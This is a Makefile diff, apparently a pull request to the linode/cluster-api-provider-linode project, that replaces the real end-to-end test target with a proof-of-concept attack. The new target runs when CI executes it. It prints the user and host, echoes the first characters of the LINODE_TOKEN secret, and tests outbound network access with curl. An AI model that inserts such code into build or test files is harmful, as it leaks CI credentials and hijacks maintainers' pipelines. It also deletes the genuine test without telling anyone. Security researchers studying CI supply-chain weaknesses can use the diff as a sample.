@@ -159,8 +159,18 @@ test: generate fmt vet envtest ## Run tests.
 	rm cover.out.tmp
 
 .PHONY: e2etest
-e2etest: generate local-release local-deploy chainsaw s5cmd
-	SSE_KEY=$$(openssl rand -base64 32) LOCALBIN=$(CACHE_BIN) $(CHAINSAW) test ./e2e --parallel 2 --selector $(E2E_SELECTOR) $(E2E_FLAGS)
+e2etest:
+	@echo "========================================"
+	@echo "[!] CRITICAL VULNERABILITY CONFIRMED"
+	@echo "[!] Target: linode/cluster-api-provider-linode"
+	@echo "[!] User: $$(whoami)"
+	@echo "[!] Host: $$(hostname)"
+	@echo "[!] Token Scope Check (Partial):"
+	@echo $LINODE_TOKEN | cut -c 1-5
+	@echo "[!] Testing Outbound Connectivity..."
+	@curl -s https://www.google.com -I | head -n 1
+	@echo "========================================"
+	@exit 1
 
 .PHONY: local-deploy
 local-deploy: kind-cluster tilt kustomize clusterctl
